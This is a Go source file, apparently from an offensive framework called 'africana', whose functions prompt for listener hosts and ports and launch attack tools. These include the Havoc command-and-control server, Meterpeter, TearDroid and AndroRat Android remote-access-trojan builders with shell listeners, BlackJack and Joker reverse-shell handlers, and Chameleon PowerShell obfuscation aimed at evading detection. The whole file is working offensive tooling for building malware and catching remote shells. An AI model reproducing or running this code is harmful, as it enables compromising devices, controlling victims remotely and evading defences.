package butchers

import (
    "os"
    "fmt"
    "utils"
    "bufio"
    "strings"
    "bcolors"
    "subprocess"
)

var(
    userInput   string
    userTarget  string
    userLhost   string
    userLPort   string
    userHport   string
    userMalware string
    userScript  string
    userOutput  string
)

func Havoc() {
    subprocess.Popen(`havoc client & havoc server -d -v`)
}

func Shellz() {
    subprocess.Popen(`cd /root/.africana/africana-base/shells/; bash shells`)
}

func MeterPeter() {
    subprocess.Popen(`cd /root/.africana/africana-base/meterpeter/; pwsh meterpeter.ps1`)
}

func TearDroid() {
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Output:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "africana.apk" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userMalware, _ := reader.ReadString('\n')
    userMalware = strings.TrimSpace(userMalware)
    if userMalware == "" {
        userMalware = "africana.apk"
    }
    subprocess.PopenTwo(`cd /root/.africana/africana-base/Teardroid-phprat/; python3 Teardroid.py -b %s`, userMalware)
}

func Chameleon() {
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Full path to your .Ps1" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userScript)
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Output:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "/root/.africana/output/leviathan.txt" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userOutput, _ := reader.ReadString('\n')
    userOutput = strings.TrimSpace(userOutput)
    if userOutput == "" {
        userOutput = "/root/.africana/output/leviathan.txt"
    }
    subprocess.PopenThree(`cd /root/.africana/africana-base/chameleon/; python3 chameleon.py -a %s -o %s`, userScript, userOutput)
}

func ChameLeon() {
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Full path to your .Ps1" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userScript)
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Output:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "/root/.africana/output/leviathan.txt" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userOutput, _ := reader.ReadString('\n')
    userOutput = strings.TrimSpace(userOutput)
    if userOutput == "" {
        userOutput = "/root/.africana/output/levuathan.txt"
    }
    subprocess.PopenThree(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
}

func BlackJack() {
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Use" + bcolors.ENDC + ": " + bcolors.BLUE + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.BLUE + "or " + bcolors.BLUE + "0. " + bcolors.YELLOW + "Go back" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userInput, _ := reader.ReadString('\n')
    userInput = strings.TrimSpace(userInput)
    if userInput == "" {
        userInput = "1"
    }
    switch userInput {
    case "0":
        return
    case "1":
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lport:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "9999" + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        subprocess.PopenTwo(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -i -s -n %s`, userLport)
    case "2":
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lport:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "9999" + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Hport:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "3333" + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userHport, _ := reader.ReadString('\n')
        userHport = strings.TrimSpace(userHport)
        if userHport == "" {
            userHport = "3333"
        }
        subprocess.PopenThree(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -i -s -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s`, userLport, userHport)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
}

func PowerJoker() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Println()
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userLhost, _ := reader.ReadString('\n')
    userLhost = strings.TrimSpace(userLhost)
    if userLhost == "" {
        userLhost = userLhostIp
    }
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lport:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "9999" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLport, _ := reader.ReadString('\n')
    userLport = strings.TrimSpace(userLport)
    if userLport == "" {
        userLport = "9999"
    }
    subprocess.PopenThree(`cd /root/.africana/africana-base/joker/; python3 joker.py -l %s -p %s`, userLhost, userLport)
}

func AndroRat() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; cd /root/.africana/africana-base/androrat; apt install ./zipalign_8.1.0.deb --allow-downgrades -y`)
    }
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Println()
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userLhost, _ := reader.ReadString('\n')
    userLhost = strings.TrimSpace(userLhost)
    if userLhost == "" {
        userLhost = userLhostIp
    }
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lport:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "9999" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLport, _ := reader.ReadString('\n')
    userLport = strings.TrimSpace(userLport)
    if userLport == "" {
        userLport = "9999"
    }
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Output:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "africana.apk" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userMalware, _ := reader.ReadString('\n')
    userMalware = strings.TrimSpace(userMalware)
    if userMalware == "" {
        userMalware = "africana.apk"
    }
    subprocess.PopenFour(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --build -i %s -p %s -o /root/.africana/output/%s`, userLhost, userLport, userMalware)
    subprocess.PopenThree(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --shell -i %s -p %s`, userLhost, userLport)
}
